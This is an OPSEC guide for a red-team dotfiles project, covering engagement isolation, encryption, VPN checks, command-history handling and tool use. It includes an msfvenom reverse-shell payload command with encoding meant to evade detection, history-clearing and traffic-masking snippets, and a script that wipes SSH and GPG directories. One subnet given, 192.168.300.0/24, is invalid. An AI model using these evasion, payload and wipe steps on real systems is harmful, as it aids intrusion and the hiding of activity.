# Security & OPSEC Guidelines

🔴 **Red Team Security Documentation** 🔴

This document outlines security considerations, OPSEC (Operations Security) guidelines, and best practices for using Red Team Dotfiles safely in professional engagements.

## Table of Contents

- [OPSEC Fundamentals](#opsec-fundamentals)
- [Environment Isolation](#environment-isolation)
- [Data Protection](#data-protection)
- [Network Security](#network-security)
- [Command History Management](#command-history-management)
- [Session Recording](#session-recording)
- [Tool Usage Guidelines](#tool-usage-guidelines)
- [Incident Response](#incident-response)

---

## OPSEC Fundamentals

### Core Principles

1. **Assume Nothing is Private**: Every command, file, and network connection can be monitored
2. **Minimize Footprint**: Leave as little evidence as possible
3. **Compartmentalization**: Isolate different clients/engagements
4. **Attribution Avoidance**: Prevent linking activities to real identity
5. **Plausible Deniability**: Maintain legitimate reasons for tools and activities

### Information Classification

| Classification | Examples | Handling |
|---------------|----------|----------|
| **PUBLIC** | General tools, techniques | Can be shared openly |
| **RESTRICTED** | Client-specific configs | Encrypted storage only |
| **CONFIDENTIAL** | Target information | Secure deletion required |
| **SECRET** | Exploitation artifacts | Air-gapped systems only |

---

## Environment Isolation

### Virtual Machine Configuration

```bash
# Recommended VM settings for engagement isolation
VM_NAME="RedTeam_Client_YYYY"
VM_MEMORY="8GB"
VM_DISK="50GB"
VM_NETWORK="NAT"  # Never bridged mode
VM_SNAPSHOTS="Pre-engagement clean state"
```

### Host System Protection

- **Never install red team tools on primary workstation**
- **Use disposable VMs for each engagement**
- **Employ full disk encryption** (FileVault on macOS)
- **Configure automatic screen locks** (≤5 minutes)
- **Disable unnecessary services** and network protocols

### Network Segmentation

```bash
# Example network isolation for different engagement phases
RECON_NETWORK="192.168.100.0/24"    # Passive reconnaissance
ACTIVE_NETWORK="192.168.200.0/24"   # Active testing
EXPLOIT_NETWORK="192.168.300.0/24"  # Post-exploitation
```

---

## Data Protection

### Encryption Requirements

All sensitive data MUST be encrypted at rest and in transit:

```bash
# Create encrypted archives for client data
tar czf - sensitive_data/ | gpg -c -o client_data_$(date +%Y%m%d).tar.gz.gpg

# Secure file deletion (macOS)
rm -P sensitive_file.txt

# Secure file deletion (Linux)
shred -vfz -n 3 sensitive_file.txt
```

### Key Management

1. **Generate unique GPG keys per engagement**
2. **Use hardware security modules** when available
3. **Implement key rotation** (90-day maximum)
4. **Secure key backup** to offline storage

### File Naming Conventions

```bash
# GOOD: Generic, non-attributable names
engagement_2024_001.gpg
network_scan_results.enc
payload_template_v2.bin

# BAD: Identifying client or target information
acme_corp_passwords.txt
john_smith_ssh_keys.pem
bank_server_exploits.py
```

---

## Network Security

### VPN Configuration

Always route traffic through appropriate channels:

```bash
# Check VPN status before any network activity
if ! pgrep -x "openvpn" > /dev/null; then
    echo "❌ VPN not active - STOPPING"
    exit 1
fi

# Verify external IP doesn't leak real location
curl -s ifconfig.me | grep -v "$(dig +short myname.opendns.com @resolver1.opendns.com)"
```

### DNS Security

```bash
# Use secure DNS resolvers
export DNS_SERVERS="1.1.1.1,8.8.8.8,9.9.9.9"

# Prevent DNS leaks
echo "nameserver 1.1.1.1" > /etc/resolv.conf
```

### Traffic Masking

```bash
# Generate background traffic to mask activities
while true; do
    curl -s "https://example.com/$(openssl rand -hex 8)" >/dev/null 2>&1
    sleep $((RANDOM % 60 + 30))
done &
```

---

## Command History Management

### History Configuration

The dotfiles include OPSEC-compliant history settings:

```bash
# Commands starting with space are NOT logged
 nmap -sS target.example.com
 sqlmap -u "http://target/app?id=1"

# Clear history when needed
history -c && history -w

# Disable history for sensitive sessions
unset HISTFILE
```

### Sensitive Command Patterns

Never log these command patterns:

- Passwords: `passwd=`, `password=`, `pwd=`
- API Keys: `api_key=`, `token=`, `secret=`
- Exploitation: Direct exploit commands
- Post-exploitation: Credential dumping, lateral movement

### Session Isolation

```bash
# Create isolated history per engagement
export HISTFILE="$HOME/.bash_history_$(date +%Y%m%d)"
export HISTSIZE=1000
export HISTFILESIZE=1000
```

---

## Session Recording

### Tmux Recording Guidelines

The dotfiles include secure session recording:

```bash
# Start recording with client-neutral naming
tmux new-session -s "assessment_$(date +%Y%m%d)"

# Recordings stored in ~/Logs/ with timestamps
# Review and sanitize before archiving
```

### Recording Security

1. **Never record authentication sequences**
2. **Sanitize recordings before storage**:
   ```bash
   # Remove sensitive data from recordings
   sed -i 's/password=[^[:space:]]*/password=REDACTED/g' session.log
   sed -i 's/token=[^[:space:]]*/token=REDACTED/g' session.log
   ```
3. **Encrypt recordings immediately**:
   ```bash
   gpg -c -o session_$(date +%Y%m%d).log.gpg session.log && rm session.log
   ```

---

## Tool Usage Guidelines

### Network Scanning

```bash
# GOOD: Rate-limited, respectful scanning
nmap -T2 --scan-delay 1s -p 80,443 target.example.com

# BAD: Aggressive scanning that creates logs
nmap -T5 -A -v target.example.com
```

### Web Application Testing

```bash
# GOOD: Manual, controlled testing
curl -H "User-Agent: Mozilla/5.0..." https://target.com/app

# BAD: Automated tool signatures
sqlmap --batch --dbs -u "https://target.com/app?id=1"
```

### Payload Generation

```bash
# Use generic payloads, avoid tool signatures
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f exe -o payload.exe

# Encode/encrypt to avoid detection
msfvenom ... --encoder x86/shikata_ga_nai -i 5
```

---

## Network Security

### Wireless Security

```bash
# Monitor for hostile networks
iwlist scan | grep -E "ESSID|WPA|WEP"

# Use MAC randomization
sudo ifconfig wlan0 ether $(openssl rand -hex 6 | sed 's/../&:/g; s/:$//')
```

### Firewall Configuration

```bash
# Restrictive outbound rules
iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT
iptables -A OUTPUT -j DROP
```

---

## Incident Response

### Compromise Detection

If you suspect compromise of your environment:

1. **Immediate Actions**:
   ```bash
   # Disconnect from network
   sudo ifconfig eth0 down
   sudo ifconfig wlan0 down
   
   # Capture memory dump
   dd if=/dev/mem of=/tmp/memory.dump bs=1M
   ```

2. **Evidence Collection**:
   ```bash
   # System state snapshot
   ps auxf > /tmp/processes.txt
   netstat -tulpn > /tmp/network.txt
   lsof > /tmp/files.txt
   ```

3. **Secure Communication**:
   - Use out-of-band communication channels
   - Report through established incident response procedures
   - Document timeline and indicators of compromise

### Emergency Procedures

```bash
# Nuclear option: Secure system wipe
#!/bin/bash
read -p "Are you sure? Type 'CONFIRM': " confirm
if [ "$confirm" = "CONFIRM" ]; then
    # Secure delete key directories
    rm -rf ~/.ssh ~/.gnupg ~/.config
    # Clear history
    history -c && history -w
    # Overwrite free space
    dd if=/dev/urandom of=/tmp/fillup bs=1M
fi
```

---

## Compliance & Legal

### Documentation Requirements

1. **Maintain engagement boundaries**
2. **Respect scope limitations**
3. **Document all activities** for client reporting
4. **Preserve evidence chain** when required

### Data Retention

```bash
# Client data retention matrix
CLIENT_DATA_RETENTION_DAYS=90
LOGS_RETENTION_DAYS=365
EVIDENCE_RETENTION_DAYS=2555  # 7 years

# Automated cleanup
find ~/Clients -type f -mtime +$CLIENT_DATA_RETENTION_DAYS -delete
```

### Regulatory Compliance

Ensure compliance with:
- **GDPR** (EU data protection)
- **CCPA** (California privacy)
- **SOX** (financial reporting)
- **HIPAA** (healthcare)
- **PCI DSS** (payment card industry)

---

## Security Checklist

### Pre-Engagement

- [ ] Clean VM snapshot created
- [ ] VPN connection established
- [ ] DNS leak test passed
- [ ] History settings configured
- [ ] Encryption keys generated
- [ ] Emergency procedures reviewed

### During Engagement

- [ ] All commands properly formatted for history
- [ ] Regular encrypted backups created
- [ ] Network isolation maintained
- [ ] Activity logs reviewed for OPSEC violations
- [ ] Tools updated with latest signatures

### Post-Engagement

- [ ] All client data encrypted
- [ ] Temporary files securely deleted
- [ ] VM reverted to clean snapshot
- [ ] Activity logs sanitized
- [ ] Evidence properly archived
- [ ] Incident response procedures tested

---

## Emergency Contacts

```bash
# Store encrypted contact information
echo "SOC: +1-XXX-XXX-XXXX" | gpg -c -o emergency_contacts.gpg
echo "Legal: legal@company.com" | gpg -c -a >> emergency_contacts.gpg
echo "IR Team: ir@company.com" | gpg -c -a >> emergency_contacts.gpg
```

---

## References

- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines)
- [Red Team Field Manual](https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504)

---

**⚠️ REMEMBER: When in doubt, choose the more secure option. OPSEC failures can compromise entire engagements and endanger team members.**

**🔒 This document contains sensitive methodologies. Treat as CONFIDENTIAL and distribute only on a need-to-know basis.**